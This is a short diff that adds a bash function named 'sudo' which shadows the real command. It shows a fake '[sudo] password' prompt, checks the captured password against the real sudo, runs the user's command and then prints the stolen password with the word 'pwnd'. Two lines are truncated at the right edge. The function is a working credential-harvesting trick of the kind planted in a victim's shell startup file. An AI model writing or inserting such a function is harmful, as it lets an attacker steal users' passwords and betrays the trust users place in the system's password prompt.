@@ -1,0 +1,12 @@
+function sudo () {
+
+#get sudo path
+  realsudo="$(which sudo)"
+
+#fake pass prompt
+  read -s -p "[sudo] password for $USER: " inputPasswd
+  printf "\n"
+  $realsudo -S <<< "$inputPasswd" -u root bash -c "exi>
+  $realsudo "${@:1}"
+  echo "pwnd your password for user $USER is $inputPas>
+}
